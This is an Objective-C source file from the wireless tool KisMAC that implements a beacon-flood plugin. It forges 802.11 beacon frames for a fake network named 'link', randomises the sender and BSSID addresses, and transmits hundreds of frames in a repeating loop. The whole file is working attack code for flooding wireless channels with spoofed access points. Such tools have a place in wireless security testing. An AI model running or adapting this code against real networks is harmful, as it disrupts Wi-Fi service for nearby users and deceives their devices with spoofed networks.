//
//  WavePluginBeaconFlood.m
//  KisMAC
//
//  Created by pr0gged on 28/12/08.
//  Copyright 2008 __MyCompanyName__. All rights reserved.
//

#import "WavePluginBeaconFlood.h"
#import "80211b.h"
#import "WaveDriver.h"

@implementation WavePluginBeaconFlood

- (bool) startTest {
    KFrame *kframe = &_beaconFrame;
    struct ieee80211_probe_beacon *beacon = (struct ieee80211_probe_beacon *)(kframe->data);
    UInt8 *infoPtr = (UInt8 *)(beacon->info_element);
    
    memset(kframe, 0 ,sizeof(KFrame));
    
    beacon->header.frame_ctl = IEEE80211_TYPE_MGT | IEEE80211_SUBTYPE_BEACON;
    
    memset(beacon->header.addr1, 0xff, 6); //set it to broadcast
    memset(beacon->header.addr2, 0xff, 6); //set it to broadcast
    memset(beacon->header.addr3, 0xcc, 6); //set it to broadcast
    
    memcpy(beacon->time_stamp, "\x01\x23\x45\x67\x89\xAB\xCD\xEF", 8);
    beacon->beacon_interval = NSSwapHostShortToLittle(64);
    beacon->capability = 0x0011;
    memcpy(infoPtr, "\x00\x04\x6c\x69\x6e\x6b", 6);
    memcpy(infoPtr+6, "\x01\x04\x82\x84\x8b\x96", 6);
    memcpy(infoPtr+12, "\x03\x01\x06", 3);
    beacon->header.seq_ctl = random() & 0x0fff;
    
    kframe->ctrl.len = sizeof(struct ieee80211_probe_beacon) + 15;
    kframe->ctrl.tx_rate = [_driver currentRate];
    
    _stopFlag = NO;
    _status = WavePluginRunning;
    
    [self doBeaconFloodNetwork];
    return YES;
}

- (void)doBeaconFloodNetwork
{
    UInt16 x[3];
    KFrame *kframe = &_beaconFrame;
    struct ieee80211_probe_beacon *beacon = (struct ieee80211_probe_beacon *)(kframe->data);

    if (_stopFlag == YES)
    {
        _stopFlag = NO;
        _status = WavePluginIdle;
        return;
    }
        
    x[0] = random() & 0x0F00;
    x[1] = random() & 0x00F0;
    x[2] = random() & 0x000F;
    
    memcpy(beacon->header.addr2, x, 6); //needs to be random
    memcpy(beacon->header.addr3, x, 6); //needs to be random
    [_driver sendKFrame:kframe
				howMany:600
			 atInterval:50
		   notifyTarget:self
   notifySelectorString:@"doBeaconFloodNetwork"];
    
    return;
}

-(bool) stopTest {
    return [super stopTest];
}

@end
